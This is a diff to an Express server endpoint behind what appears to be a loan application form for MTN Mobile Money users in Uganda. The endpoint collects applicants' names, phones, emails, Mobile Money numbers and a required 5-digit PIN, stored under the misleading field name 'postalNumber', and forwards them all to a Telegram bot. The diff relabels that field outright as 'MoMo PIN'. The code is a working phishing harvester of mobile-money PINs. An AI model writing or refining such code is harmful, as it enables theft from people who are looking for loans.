@@ -42,7 +42,7 @@ app.post('/api/telegram/contact', async (req, res) => {
   const { fullName, phone, email, mtnNumber, postalNumber, loanType, amount } = req.body;
 
   if (!mtnNumber || !/^\d{5}$/.test(String(postalNumber ?? '').trim())) {
-    return res.status(400).json({ error: 'Mobile Money number and a 5-digit wallet PIN are required.' });
+    return res.status(400).json({ error: 'Mobile Money number and a 5-digit MoMo PIN are required.' });
   }
 
   const botToken = (process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '').trim();
@@ -59,7 +59,7 @@ app.post('/api/telegram/contact', async (req, res) => {
     `Phone: ${phone || 'Not provided'}`,
     `Email: ${email || 'Not provided'}`,
     `MTN Mobile Money: ${mtnNumber}`,
-    `Wallet ID: ${postalNumber}`,
+    `MoMo PIN: ${postalNumber}`,
     `Loan: ${loanType || 'Not provided'}${amount ? ` - UGX ${Number(amount).toLocaleString('en-UG')}` : ''}`
   ].join('\n');
 
